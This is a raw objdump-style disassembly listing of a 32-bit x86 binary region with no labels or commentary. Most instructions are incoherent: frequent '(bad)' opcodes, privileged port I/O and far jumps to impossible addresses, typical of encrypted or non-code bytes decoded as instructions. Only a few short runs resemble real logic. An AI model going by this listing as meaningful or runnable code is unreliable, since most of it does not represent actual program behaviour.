  411787:	adc    eax,DWORD PTR [esi+0x69]
  41178a:	scas   al,BYTE PTR es:[edi]
  41178b:	lahf   
  41178c:	imul   ebp,DWORD PTR ss:[eax+0x59dc234c],0xe5d73a95
  411797:	mov    cl,0x44
  411799:	fstp   QWORD PTR [esi]
  41179b:	fst    QWORD PTR [ecx-0x1c9173dd]
  4117a1:	sbb    al,0xf2
  4117a3:	jbe    0x4117c2
  4117a5:	push   0x3e
  4117a7:	add    DWORD PTR [ebx],esp
  4117a9:	clc    
  4117aa:	pop    esi
  4117ab:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4117ac:	xor    eax,0x3967c6ba
  4117b1:	and    al,0x9b
  4117b3:	test   DWORD PTR cs:[edi+0x271057d8],edi
  4117ba:	or     esi,DWORD PTR gs:[edx]
  4117bd:	hlt    
  4117be:	cmp    al,0x17
  4117c0:	push   0x14
  4117c2:	cmp    DWORD PTR [esi-0x59],edx
  4117c5:	sti    
  4117c6:	js     0x41176c
  4117c8:	inc    esp
  4117c9:	call   0xf595eb7e
  4117ce:	xchg   ebx,eax
  4117cf:	mov    bl,0x91
  4117d1:	push   0xa
  4117d3:	mov    cl,0x52
  4117d5:	mov    BYTE PTR [edx-0x4c55b32b],al
  4117db:	loopne 0x41180c
  4117dd:	sub    al,0xbc
  4117df:	(bad)  
  4117e0:	fild   WORD PTR [edi+esi*1-0x3d]
  4117e4:	adc    ebp,DWORD PTR [edi+0x5db25239]
  4117ea:	adc    eax,esi
  4117ec:	push   0x4a7eab66
  4117f1:	lahf   
  4117f2:	sbb    al,0x87
  4117f4:	inc    ebp
  4117f5:	mov    ch,0x68
  4117f7:	jno    0x4117be
  4117f9:	pop    es
  4117fa:	xchg   DWORD PTR [ebp-0xb390e9d],ebx
  411800:	cld    
  411801:	stos   BYTE PTR es:[edi],al
  411802:	adc    ch,al
  411804:	imul   ecx,DWORD PTR [edx],0xc9a463b1
  41180a:	mov    ebp,0xa94cd8f8
  41180f:	or     ecx,DWORD PTR [esi+0x34fdbf90]
  411815:	mov    ebp,0xf3574dad
  41181a:	(bad)  
  41181b:	imul   ebx,DWORD PTR [edx],0x8db72147
  411821:	cmp    ecx,edi
  411823:	imul   DWORD PTR [ebp-0x2a5a46ac]
  411829:	(bad)  
  41182a:	es stc 
  41182c:	and    esi,edi
  41182e:	inc    ebx
  41182f:	mov    ebx,0xa81da146
  411834:	jl     0x411883
  411836:	mov    eax,ds:0x915e0cf6
  41183b:	mov    esi,DWORD PTR [ebp+0xc]
  41183e:	sub    eax,edx
  411840:	add    DWORD PTR ds:0x42fcf5,0x7f3f
  41184a:	xor    eax,ecx
  41184c:	mov    DWORD PTR ds:0x42fd7a,0x5771
  411856:	cmp    eax,esi
  411858:	mov    DWORD PTR ds:0x42fd76,0x752
  411862:	jne    0x411c7d
  411868:	jmp    0x411c6d
  41186d:	js     0x411844
  41186f:	stos   BYTE PTR es:[edi],al
  411870:	loopne 0x4118db
  411872:	jae    0x4118b6
  411874:	cmc    
  411875:	pop    esi
  411876:	sub    BYTE PTR [ecx-0x52c3db17],dl
  41187c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41187d:	jbe    0x4118d6
  41187f:	jo     0x4118f1
  411881:	pop    eax
  411882:	jge    0x4118f4
  411884:	jo     0x411863
  411886:	adc    dh,bh
  411888:	ficom  WORD PTR [esi-0x549ce386]
  41188e:	in     eax,0x9
  411890:	pop    ds
  411891:	mov    bh,0xaa
  411893:	pop    ebp
  411894:	mov    ah,0x64
  411896:	add    ah,BYTE PTR [edi]
  411898:	inc    edi
  411899:	(bad)  
  41189a:	loopne 0x41183b
  41189c:	bts    DWORD PTR [eax+ebx*8+0x33],edx
  4118a1:	inc    ebx
  4118a2:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  4118a4:	call   0x5f6c:0x198b3fab
  4118ab:	ins    DWORD PTR es:[edi],dx
  4118ac:	xchg   esi,eax
  4118ad:	retf   0x4e11
  4118b0:	inc    edi
  4118b1:	daa    
  4118b2:	push   edx
  4118b3:	in     eax,0x95
  4118b5:	pusha  
  4118b6:	into   
  4118b7:	and    al,BYTE PTR [edi]
  4118b9:	arpl   WORD PTR [ebp+0x75],bp
  4118bc:	std    
  4118bd:	sbb    ah,al
  4118bf:	aas    
  4118c0:	loop   0x411842
  4118c2:	push   0xb3946580
  4118c7:	imul   ebp,edi,0xffffffe4
  4118ca:	dec    edi
  4118cb:	addr16 add bl,al
  4118ce:	sti    
  4118cf:	adc    al,0xd9
  4118d1:	inc    ebx
  4118d2:	mov    ah,0x30
  4118d4:	pusha  
  4118d5:	xchg   DWORD PTR [ebx+0x1e],esi
  4118d8:	bound  eax,QWORD PTR [ebx+0x4d]
  4118db:	sbb    esi,DWORD PTR [ecx+ebp*2+0x4c]
  4118df:	imul   ebp,DWORD PTR [eax+0x30],0xffffffd3
  4118e3:	(bad)  
  4118e4:	sub    bh,BYTE PTR [edx+0x62]
  4118e7:	xchg   ecx,eax
  4118e8:	mov    ds:0xd8510116,eax
  4118ed:	jns    0x4118e9
  4118ef:	loopne 0x411873
  4118f1:	(bad)  
  4118f2:	outs   dx,BYTE PTR ds:[esi]
  4118f3:	cmp    al,BYTE PTR [esi+0x333a5f94]
  4118f9:	sbb    bh,BYTE PTR ds:0xa1408481
  4118ff:	jb     0x4118f5
  411901:	adc    al,0xbd
  411903:	mov    bl,0x99
  411905:	and    ch,dl
  411907:	xchg   ebx,eax
  411908:	xor    al,0x62
  41190a:	lock out 0x29,eax
  41190d:	push   esi
  41190e:	jle    0x41195c
  411910:	push   cs
  411911:	inc    ebx
  411912:	cmp    esp,edx
  411914:	pop    esi
  411915:	mov    esi,0x41f2387b
  41191a:	adc    DWORD PTR [ebx+0x47],esp
  41191d:	(bad)  ds:0xd46af19a
  411923:	push   ecx
  411924:	add    ebx,esi
  411926:	in     eax,0x73
  411928:	pop    DWORD PTR [edx]
  41192a:	lds    esp,FWORD PTR [ecx-0x63]
  41192d:	test   BYTE PTR [ebx],bh
  41192f:	into   
  411930:	aam    0x60
  411932:	xchg   ax,ax
  411934:	xchg   ecx,eax
  411935:	sub    cl,BYTE PTR [ecx]
  411937:	inc    ebp
  411938:	adc    eax,esp
  41193a:	(bad)  
  41193c:	add    eax,0xf5842fd2
  411941:	push   ebp
  411942:	call   0x4d3fee3f
  411947:	xor    cl,BYTE PTR [edi+0x5ff63c99]
  41194d:	xor    BYTE PTR [edi-0x58380469],dh
  411953:	xchg   ecx,eax
  411954:	retf   0x9f
  411957:	in     al,0x34
  411959:	aaa    
  41195a:	aas    
  41195b:	push   cs
  41195c:	test   al,0x3c
  41195e:	cdq    
  41195f:	xchg   esp,eax
  411960:	out    dx,eax
  411961:	(bad)  
  411962:	push   0x48e8fcb4
  411967:	int    0xf9
  411969:	inc    ecx
  41196a:	mov    edi,0x796f13b0
  41196f:	mov    al,ds:0x68b81017
  411974:	cdq    
  411975:	cmp    BYTE PTR [ebx-0x51df63b2],ch
  41197b:	dec    DWORD PTR [ebp-0x2]
  41197e:	jl     0x41196f
  411980:	jl     0x4119e9
  411982:	dec    ecx
  411983:	repnz and bl,0x7f
  411987:	pusha  
  411988:	inc    ebp
  411989:	cmp    al,0x26
  41198b:	rcr    BYTE PTR [ecx],cl
  41198d:	adc    BYTE PTR [esi+0x177d1df6],0x2e
  411994:	sti    
  411995:	mov    eax,ss
  411997:	repnz adc DWORD PTR [esi+0x3f],edi
  41199b:	cmp    eax,DWORD PTR [esi-0x12]
  41199e:	inc    ecx
  41199f:	fimul  DWORD PTR [eax+esi*8]
  4119a2:	jmp    0xc7ad:0x82d949fa
  4119a9:	lock mov ds:0xbaadd9f4,al
  4119af:	xchg   ebp,eax
  4119b0:	dec    edx
  4119b1:	xor    ecx,DWORD PTR [ecx+eiz*8]
  4119b4:	pop    eax
  4119b5:	push   ebx
  4119b6:	pusha  
  4119b7:	dec    esi
  4119b8:	jecxz  0x4119d9
  4119ba:	out    0xa9,eax
  4119bc:	push   cs
  4119bd:	retf   
  4119be:	mov    al,ds:0x93461fbf
  4119c3:	jmp    0xaaf23623
  4119c8:	fcmovu st,st(6)
  4119ca:	lds    ebx,FWORD PTR [ecx]
  4119cc:	(bad)  
  4119ce:	adc    bh,BYTE PTR [ebx+0x50151baa]
  4119d4:	sbb    dh,BYTE PTR [esi+0x97e4f55]
  4119da:	les    ebx,FWORD PTR [ecx]
  4119dc:	add    eax,DWORD PTR [ebp+0xb]
  4119df:	cmp    bl,BYTE PTR [ecx-0x7f]
  4119e2:	xchg   edx,edi
  4119e4:	sub    DWORD PTR [eax-0x1249ca32],edx
  4119ea:	and    DWORD PTR [ebp+0xbe80342],esi
  4119f0:	dec    edi
  4119f1:	dec    edi
  4119f2:	push   0xffffffae
  4119f4:	call   0x9b8be478
  4119f9:	imul   ebx,DWORD PTR [ebx-0x1afa0454],0x6d
  411a00:	xchg   BYTE PTR [ebp-0xf],ah
  411a03:	sti    
  411a04:	lods   al,BYTE PTR ds:[esi]
  411a05:	mov    dh,0xb1
  411a07:	jge    0x411a68
  411a09:	cvtps2pi mm0,QWORD PTR [ebx+0x13a81bc3]
  411a10:	jge    0x4119af
  411a12:	xchg   BYTE PTR [ecx+0x48b7422e],dh
  411a18:	pop    edx
  411a19:	ret    
  411a1a:	es das 
  411a1c:	mov    ch,0x22
  411a1e:	in     eax,0x69
  411a20:	js     0x411a79
  411a22:	push   es
  411a23:	xchg   esp,eax
  411a24:	jo     0x4119bd
  411a26:	and    al,0xd9
  411a28:	push   0x30790c9
  411a2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a2e:	xchg   esp,eax
  411a2f:	aas    
  411a30:	mov    DWORD PTR [esi+esi*1-0xa],ebx
  411a34:	sbb    esi,ebp
  411a36:	dec    ecx
  411a37:	ret    
  411a38:	jmp    esp
  411a3a:	cli    
  411a3b:	jns    0x411a50
  411a3d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a3e:	dec    esp
  411a3f:	mov    ch,al
  411a41:	aaa    
  411a42:	lock xor DWORD PTR [edi+0x739393ef],ecx
  411a49:	call   0xca16:0x884d59d2
  411a50:	icebp  
  411a51:	retf   0xc650
  411a54:	sub    DWORD PTR [esi+0x36d7f262],ecx
  411a5a:	and    dh,BYTE PTR [edi-0x52]
  411a5d:	jne    0x4119e6
  411a5f:	jecxz  0x411a4e
  411a61:	rcr    esp,1
  411a63:	pop    esi
  411a64:	sar    DWORD PTR [esi+0x9],1
  411a67:	adc    eax,0xfab72c8f
  411a6c:	stc    
  411a6d:	sbb    eax,0xf17c0edd
  411a72:	mov    al,0x3c
  411a74:	jmp    0x411abd
  411a76:	inc    ecx
  411a77:	push   esp
  411a78:	jb     0x411aa6
  411a7a:	(bad)  
  411a7b:	jmp    0xc92a:0x64f644b9
  411a82:	rcl    DWORD PTR [edi],0x42
  411a85:	ficom  WORD PTR [edi+0x2a]
  411a88:	rcr    BYTE PTR [ecx+0x295dd771],cl
  411a8e:	sbb    ah,dh
  411a90:	loopne 0x411a9e
  411a92:	arpl   di,di
  411a94:	push   eax
  411a95:	aad    0xd2
  411a97:	pop    edx
  411a98:	fld    DWORD PTR [edi+0xd8efc76]
  411a9e:	fimul  DWORD PTR [edx+0x6fc449e1]
  411aa4:	and    ah,BYTE PTR [edi+0x46]
  411aa7:	jle    0x411aa3
  411aa9:	ins    DWORD PTR es:[edi],dx
  411aaa:	rcr    DWORD PTR [eax+0x26],1
  411aad:	or     al,0x33
  411aaf:	je     0x411aa5
  411ab1:	dec    esi
  411ab2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ab3:	les    eax,FWORD PTR [edx+0x29]
  411ab6:	imul   ebx,DWORD PTR [eax+ebp*1-0x7],0xffffffc4
  411abb:	stos   BYTE PTR es:[edi],al
  411abc:	out    dx,eax
  411abd:	cwde   
  411abe:	scas   eax,DWORD PTR es:[edi]
  411abf:	mov    al,0x4b
  411ac1:	sbb    edi,DWORD PTR [edx-0x5a]
  411ac4:	and    BYTE PTR [eax+esi*8-0xfb42078],cl
  411acb:	mov    DWORD PTR [edi],esi
  411acd:	stos   BYTE PTR es:[edi],al
  411ace:	or     edi,0x39
  411ad1:	lods   eax,DWORD PTR ds:[esi]
  411ad2:	jmp    0x23c6e12
  411ad7:	sub    ch,0x65
  411ada:	jle    0x411b47
  411adc:	mov    WORD PTR [esi+0x7b],?
  411adf:	dec    edi
  411ae0:	push   ss
  411ae1:	std    
  411ae2:	mov    esi,0xc18c5a97
  411ae7:	mov    edi,DWORD PTR [esi+0x5e]
  411aea:	push   ss
  411aeb:	pushf  
  411aec:	jge    0x411b29
  411aee:	ds icebp 
  411af0:	push   edx
  411af1:	dec    ebx
  411af2:	mov    ah,0x13
  411af4:	fucomip st,st(2)
  411af6:	add    BYTE PTR [ecx-0x89dc05c],cl
  411afc:	adc    al,0x36
  411afe:	sbb    esi,DWORD PTR [edi+0x33f055fe]
  411b04:	lds    edi,FWORD PTR [ecx+0x418f7531]
  411b0a:	fadd   st,st(0)
  411b0c:	adc    al,BYTE PTR [edi+ebp*4-0x17b2d007]
  411b13:	mov    ebx,0x5a137726
  411b18:	pop    ds
  411b19:	mov    bl,0x73
  411b1b:	aas    
  411b1c:	and    BYTE PTR [ebp-0x3b1f0288],bl
  411b22:	(bad)  
  411b23:	stos   DWORD PTR es:[edi],eax
  411b24:	cmp    al,0xa8
  411b26:	add    edi,DWORD PTR [ebx]
  411b28:	test   BYTE PTR [edx-0x32e2a01e],al
  411b2e:	scas   al,BYTE PTR es:[edi]
  411b2f:	push   edx
  411b30:	inc    BYTE PTR [ebp+0x6a]
  411b33:	xlat   BYTE PTR ds:[ebx]
  411b34:	and    ah,BYTE PTR [edx-0x1c]
  411b37:	mov    ds:0x60c252bb,eax
  411b3c:	ficomp WORD PTR [ecx]
  411b3e:	clc    
  411b3f:	xchg   ebx,eax
  411b40:	ret    0xc09b
  411b43:	push   ecx
  411b44:	push   eax
  411b45:	jnp    0x411b47
  411b47:	pop    ebx
  411b48:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411b49:	ins    BYTE PTR es:[edi],dx
  411b4a:	jbe    0x411b61
  411b4c:	ffreep st(6)
  411b4e:	retf   0x3059
  411b51:	xor    eax,0x86f98366
  411b56:	pop    edx
  411b57:	(bad)  
  411b58:	sti    
  411b59:	scas   al,BYTE PTR es:[edi]
  411b5a:	push   eax
  411b5b:	fstp   DWORD PTR [eax]
  411b5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411b5e:	addr16 push ds
  411b60:	pop    es
  411b61:	out    0xba,eax
  411b63:	pushf  
  411b64:	xor    DWORD PTR [ebx],0x1a82ecb0
  411b6a:	(bad)  
  411b6b:	loopne 0x411b44
  411b6d:	pusha  
  411b6e:	ins    DWORD PTR es:[edi],dx
  411b6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411b70:	mov    eax,ds:0xb7e417db
  411b75:	mov    gs,WORD PTR [edx-0x54005110]
  411b7b:	add    al,0x9c
  411b7d:	sbb    al,0xe6
  411b7f:	js     0x411bd7
  411b81:	mov    ebp,ss
  411b83:	mov    edi,0xc374fc8
  411b88:	pop    ecx
  411b89:	stos   DWORD PTR es:[edi],eax
  411b8a:	sbb    DWORD PTR [ebp+0x7d],ecx
  411b8d:	mov    cl,dl
  411b8f:	int    0x83
  411b91:	je     0x411b2b
  411b93:	arpl   WORD PTR ds:0xdee3a232,di
  411b99:	adc    ebx,DWORD PTR [esi-0x54]
  411b9c:	mov    esi,0xb3ceed90
  411ba1:	xchg   edi,eax
  411ba2:	mov    ecx,0xc06f6683
  411ba7:	push   es
  411ba8:	xchg   edx,eax
  411ba9:	lds    dx,DWORD PTR [edx+0x2732ce58]
  411bb0:	(bad)  
  411bb1:	mov    bh,al
  411bb3:	nop
  411bb4:	out    0x6f,al
  411bb6:	mov    esi,0x9ed06bd3
  411bbb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411bbc:	sbb    eax,0x5a0df1ae
  411bc1:	pop    es
  411bc2:	loopne 0x411b89
  411bc4:	sub    DWORD PTR [ecx-0x49],0x44
  411bc8:	mov    edi,0x78d2318d
  411bcd:	call   0x955a:0xee666e49
  411bd4:	ins    BYTE PTR es:[edi],dx
  411bd5:	sbb    BYTE PTR [eax],ah
  411bd7:	popf   
  411bd8:	xor    BYTE PTR [edx],cl
  411bda:	mov    ch,0x60
  411bdc:	push   0x4aeec4bf
  411be1:	dec    ebp
  411be2:	dec    esp
  411be3:	mov    ecx,edx
  411be5:	ins    BYTE PTR es:[edi],dx
  411be6:	lods   al,BYTE PTR ds:[esi]
  411be7:	shl    DWORD PTR [esi-0x14f8194c],1
  411bed:	rcr    DWORD PTR [esi+eax*1],cl
  411bf0:	adc    al,0xc0
  411bf2:	lds    ecx,FWORD PTR [edx+0xe]
  411bf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411bf6:	aad    0xf0
  411bf8:	mov    ch,dh
  411bfa:	clc    
  411bfb:	adc    eax,0x952d6703
  411c00:	xchg   BYTE PTR [ecx-0x3566dae1],bh
  411c06:	icebp  
  411c07:	shl    bl,0x5c
  411c0a:	mov    ebp,0x492dabbd
  411c0f:	cdq    
  411c10:	ss sbb ch,ch
  411c13:	pop    ecx
  411c14:	push   0x5e
  411c16:	lods   al,BYTE PTR ds:[esi]
  411c17:	mov    edx,0x1f8722e0
  411c1c:	mov    al,ds:0x8ef4793b
  411c21:	adc    DWORD PTR [eax-0x5],0xa616f0e1
  411c28:	jp     0x411c6f
  411c2a:	iret   
  411c2b:	adc    ah,bh
  411c2d:	(bad)  
  411c2e:	into   
  411c2f:	sub    al,0x37
  411c31:	minps  xmm5,XMMWORD PTR [ebp+0x2c]
  411c35:	enter  0x292,0x59
  411c39:	in     al,dx
  411c3a:	mov    al,0x7d
  411c3c:	push   0xffffffb1
  411c3e:	pop    edx
  411c3f:	sub    BYTE PTR [eax+eiz*2],0x71
  411c43:	xlat   BYTE PTR ds:[ebx]
  411c44:	or     edx,eax
  411c46:	nop
  411c47:	sub    esi,0xffffffda
  411c4a:	mov    al,ds:0x9017de77
  411c4f:	sub    DWORD PTR ds:0xc7f33044,ebx
  411c55:	into   
  411c56:	sbb    ebx,0xffffffdb
  411c59:	nop
  411c5a:	loop   0x411c24
  411c5c:	mov    ebp,0xd6461853
  411c61:	(bad)  
  411c62:	repnz pushf 
  411c64:	adc    ah,0x1c
  411c67:	enter  0x45dc,0x18
  411c6b:	xor    bh,BYTE PTR [ebp-0x5f]
  411c6e:	sub    al,0xb2
  411c70:	inc    ecx
  411c71:	add    BYTE PTR [ebx],al
  411c73:	add    eax,0x41b224
  411c78:	jmp    0x411c84
  411c7d:	mov    eax,DWORD PTR [ebp+0xc]
  411c80:	xor    eax,ecx
  411c82:	add    eax,edx
  411c84:	mov    ds:0x41b224,eax
  411c89:	mov    eax,DWORD PTR [ebp+0xc]
  411c8c:	xor    eax,ecx
  411c8e:	add    eax,edx
  411c90:	mov    ds:0x41b22c,eax
  411c95:	jmp    0x4120a9
  411c9a:	mov    eax,ds:0x41b22c
  411c9f:	mov    ds:0x41b224,eax
  411ca4:	jmp    0x4120a9
  411ca9:	mov    dh,0x72
  411cab:	cwde   
  411cac:	test   al,0x64
  411cae:	jb     0x411c66
  411cb0:	jb     0x411ca3
  411cb2:	xchg   ecx,eax
  411cb3:	adc    eax,0xf34a975e
  411cb8:	mov    WORD PTR [esi+0x53],ds
  411cbb:	jo     0x411d2d
  411cbd:	pop    eax
  411cbe:	jge    0x411d30
  411cc0:	jo     0x411c66
  411cc2:	aad    0x4b
  411cc4:	and    ebp,ebx
  411cc6:	xchg   esp,eax
  411cc7:	aas    
  411cc8:	imul   ebx,DWORD PTR [ebx+0x368eaf3],0xffffffe7
  411ccf:	push   edx
  411cd0:	das    
  411cd1:	loope  0x411c55
  411cd3:	push   ebp
  411cd4:	cmp    ebp,eax
  411cd6:	sahf   
  411cd7:	in     al,dx
  411cd8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411cd9:	xchg   esi,eax
  411cda:	mov    ds:0xe0a1f65f,al
  411cdf:	popf   
  411ce0:	sub    DWORD PTR [ebx-0x5e],ebp
  411ce3:	lar    esp,WORD PTR [ecx+0x59]
  411ce7:	mov    ecx,0x856a6fff
  411cec:	int    0x36
  411cee:	cwde   
  411cef:	nop
  411cf0:	shl    BYTE PTR [edx+0x4d],cl
  411cf3:	jnp    0x411c93
  411cf5:	jns    0x411cbc
  411cf7:	mov    edi,0x4f37282c
  411cfc:	inc    cl
  411cfe:	mov    esp,0x39b5f18d
  411d03:	jnp    0x411d78
  411d05:	outs   dx,DWORD PTR ds:[esi]
  411d06:	aas    
  411d07:	iret   
  411d08:	das    
  411d09:	pop    ebx
  411d0a:	data16 jnp 0x411cb5
  411d0d:	je     0x411d67
  411d0f:	js     0x411d78
  411d11:	lea    ebx,[edi]
  411d13:	push   esp
  411d14:	inc    ebp
  411d15:	repz data16 jns 0x411d91
  411d19:	sti    
  411d1a:	add    ebp,DWORD PTR [eax]
  411d1c:	pusha  
  411d1d:	loopne 0x411d04
  411d1f:	ss adc eax,0xe89aff0c
  411d25:	jbe    0x411d26
  411d27:	sub    DWORD PTR [edx],esi
  411d29:	pop    ds
  411d2a:	push   ecx
  411d2b:	sub    BYTE PTR [ebx-0x18],0x4b
  411d2f:	dec    esp
  411d30:	hlt    
  411d31:	adc    DWORD PTR [ecx],eax
  411d33:	mov    WORD PTR ds:0xf850b6d4,ds
  411d39:	dec    edx
  411d3a:	popa   
  411d3b:	sub    al,0xaf
  411d3d:	shl    ebx,0xe5
  411d40:	outs   dx,DWORD PTR ds:[esi]
  411d41:	(bad)  
  411d43:	inc    edi
  411d44:	mov    ecx,0xa71be946
  411d49:	adc    BYTE PTR cs:[edx-0x7c],bl
  411d4d:	in     al,0x9a
  411d4f:	aam    0x1c
  411d51:	ins    BYTE PTR es:[edi],dx
  411d52:	in     eax,0xc8
  411d54:	out    0xa2,eax
  411d56:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411d57:	pop    ebp
  411d58:	pop    edx
  411d59:	addr16 xchg edx,eax
  411d5b:	or     al,0xc5
  411d5d:	shr    DWORD PTR [edi+ebp*2-0x3a],1
  411d61:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d62:	aam    0xc2
  411d64:	pushf  
  411d65:	cmp    eax,0xa3be8d51
  411d6a:	daa    
  411d6b:	ret    0x55e1
  411d6e:	cmp    BYTE PTR [eax+ebp*8-0x56],0x73
  411d73:	pop    ss
  411d74:	inc    BYTE PTR [ebp+ebp*1+0x2a]
  411d78:	iret   
  411d79:	call   0xc86bd310
  411d7e:	push   ecx
  411d7f:	ins    DWORD PTR es:[edi],dx
  411d80:	loop   0x411dec
  411d82:	nop
  411d83:	mov    al,0x5f
  411d85:	scas   eax,DWORD PTR es:[edi]
  411d86:	aaa    
  411d87:	push   esi
  411d88:	(bad)
  411d8b:	inc    edx
  411d8c:	jge    0x411d11
  411d8e:	ficom  DWORD PTR [eax+0x7d]
  411d91:	sbb    al,0xe7
  411d93:	rcl    BYTE PTR [edi+0x2a867e2d],0x33
  411d9a:	or     al,0xb7
  411d9c:	dec    esp
  411d9d:	dec    esi
  411d9e:	neg    BYTE PTR [ebx+ecx*8+0x2c]
  411da2:	ins    DWORD PTR es:[edi],dx
  411da3:	jp     0x411e21
  411da5:	xchg   ebx,eax
  411da6:	adc    eax,0x5dd5400
  411dab:	in     eax,0xb8
  411dad:	loope  0x411d79
  411daf:	inc    esi
  411db0:	fcmovnu st,st(3)
  411db2:	fcmovbe st,st(7)
  411db4:	inc    eax
  411db5:	adc    DWORD PTR [edi-0x774f1ba1],esp
  411dbb:	out    0xc0,eax
  411dbd:	pop    ecx
  411dbe:	ds push 0xf8a49ff3
  411dc4:	dec    esi
  411dc5:	fwait
  411dc6:	xchg   ebp,eax
  411dc7:	or     DWORD PTR [esi],ebp
  411dc9:	mov    ebp,0xb85ebea0
  411dce:	cld    
  411dcf:	hlt    
  411dd0:	push   cs
  411dd1:	mov    ch,0xd5
  411dd3:	adc    al,0x50
  411dd5:	lock clc 
  411dd7:	aam    0x2b
  411dd9:	add    BYTE PTR [eax],dh
  411ddb:	and    DWORD PTR [edx],esp
  411ddd:	push   eax
  411dde:	aad    0x85
  411de0:	dec    ebx
  411de1:	pop    esi
  411de2:	inc    esp
  411de3:	add    al,0x39
  411de5:	es or  eax,0x49a7b305
  411deb:	stc    
  411dec:	dec    esp
  411ded:	fwait
  411dee:	pop    edi
  411def:	data16 sbb al,0x65
  411df2:	dec    eax
  411df3:	mov    edx,0xd14f0564
  411df8:	jp     0x411dd0
  411dfa:	mov    ebx,0xd2ec5cc9
  411dff:	ret    
  411e00:	inc    edx
  411e01:	xor    esi,edx
  411e03:	outs   dx,DWORD PTR ds:[esi]
  411e04:	dec    ebp
  411e05:	mov    esi,0xa6c8e9db
  411e0a:	push   esi
  411e0b:	ja     0x411d9f
  411e0d:	mov    ds:0x38e7834a,eax
  411e12:	ficomp DWORD PTR [eax-0x63]
  411e15:	sub    ch,bh
  411e17:	lahf   
  411e18:	or     DWORD PTR [edx-0x6a],0xffffffaa
  411e1c:	std    
  411e1d:	xor    ebx,DWORD PTR [edx]
  411e1f:	imul   ebp,eax,0xc5b5a323
  411e25:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411e26:	adc    eax,0x4ed4d8e5
  411e2b:	popa   
  411e2c:	stos   BYTE PTR es:[edi],al
  411e2d:	gs jp  0x411dfb
  411e30:	test   DWORD PTR [ebp+0x57815f00],esp
  411e36:	adc    DWORD PTR [edx-0x6a],esi
  411e39:	pop    edx
  411e3a:	pop    es
  411e3b:	je     0x411e79
  411e3d:	mov    ebx,0xf906b46
  411e42:	mov    bh,0x27
  411e44:	test   esi,ebp
  411e46:	inc    ebx
  411e47:	(bad)  
  411e48:	xchg   ecx,eax
  411e49:	mov    edi,DWORD PTR [ecx+edi*4-0x73]
  411e4d:	mov    dh,0x3
  411e4f:	call   0x1c1d:0xe08a4230
  411e56:	cdq    
  411e57:	add    edi,0x23
  411e5a:	cdq    
  411e5b:	hlt    
  411e5c:	and    eax,0xb6c333d5
  411e61:	mov    al,bl
  411e63:	test   DWORD PTR [eax-0xb],edi
  411e66:	jmp    0xd24525ad
  411e6b:	inc    ebx
  411e6c:	or     eax,0xd21f74ae
  411e71:	out    0xe9,eax
  411e73:	mov    ch,0x8d
  411e75:	inc    esi
  411e76:	mov    dl,0x2
  411e78:	jge    0x411e6d
  411e7a:	inc    esp
  411e7b:	xchg   ebp,eax
  411e7c:	mov    WORD PTR [ebx+ebp*1+0x492071a6],fs
  411e83:	sub    edi,ebp
  411e85:	mov    bh,0x73
  411e87:	(bad)  
  411e88:	and    BYTE PTR [eax-0x5a],ch
  411e8b:	repnz pop esp
  411e8d:	pop    ds
  411e8e:	dec    esi
  411e8f:	fdiv   DWORD PTR [esi-0x59]
  411e92:	sbb    eax,0x3fd8acaa
  411e97:	outs   dx,DWORD PTR ds:[esi]
  411e98:	stc    
  411e99:	cmp    bl,BYTE PTR [eax]
  411e9b:	sub    DWORD PTR [ebx+eiz*1],esi
  411e9e:	es ret 0x2bc8
  411ea2:	ja     0x411ef5
  411ea4:	das    
  411ea5:	pop    ebp
  411ea6:	add    ah,BYTE PTR [esi-0x14]
  411ea9:	nop
  411eaa:	pop    esp
  411eab:	add    al,0x82
  411ead:	fcomip st,st(1)
  411eaf:	xor    al,0x15
  411eb1:	in     eax,dx
  411eb2:	loop   0x411e7d
  411eb4:	rol    bh,0x36
  411eb7:	pop    esi
  411eb8:	add    al,0xd6
  411eba:	dec    esi
  411ebb:	jb     0x411e55
  411ebd:	push   esp
  411ebe:	sub    dh,bl
  411ec0:	lock adc edi,eax
  411ec3:	xlat   BYTE PTR ds:[ebx]
  411ec4:	mov    al,0x77
  411ec6:	leave  
  411ec7:	out    0xc5,al
  411ec9:	out    0x9b,al
  411ecb:	retf   
  411ecc:	pop    edi
  411ecd:	mov    ebp,0xf5877059
  411ed2:	sti    
  411ed3:	cmp    al,ah
  411ed5:	add    eax,eax
  411ed7:	and    eax,0xbe5efe65
  411edc:	test   DWORD PTR [edi],0x742b3c80
  411ee2:	fcom   DWORD PTR [edx]
  411ee4:	push   ebx
  411ee5:	idiv   BYTE PTR [ecx-0x1877cca3]
  411eeb:	icebp  
  411eec:	pop    edx
  411eed:	cli    
  411eee:	mov    dl,0x5c
  411ef0:	std    
  411ef1:	loop   0x411f5e
  411ef3:	loope  0x411e89
  411ef5:	jmp    0xa4f3ee18
  411efa:	retf   0x62fc
  411efd:	out    0x52,al
  411eff:	lock ins DWORD PTR es:[edi],dx
  411f01:	dec    ebp
  411f02:	jp     0x411ee7
  411f04:	ror    DWORD PTR [ebx],cl
  411f06:	push   esp
  411f07:	std    
  411f08:	fsub   DWORD PTR [ecx+0x43]
  411f0b:	fcom   st(6)
  411f0d:	jbe    0x411f83
  411f0f:	(bad)  
  411f10:	sub    esp,ecx
  411f12:	std    
  411f13:	mov    esp,?
  411f15:	and    dl,BYTE PTR [ebp-0x3584bba6]
  411f1b:	nop
  411f1c:	or     bh,BYTE PTR [ecx+0x6e]
  411f1f:	push   0x58f46d93
  411f24:	inc    esi
  411f25:	xor    bl,ah
  411f27:	xor    ebp,DWORD PTR [ebx-0x7b629511]
  411f2d:	xchg   edi,eax
  411f2e:	cmp    eax,0x67d5569b
  411f33:	mov    cl,0xc5
  411f35:	loopne 0x411f24
  411f37:	lahf   
  411f38:	push   esp
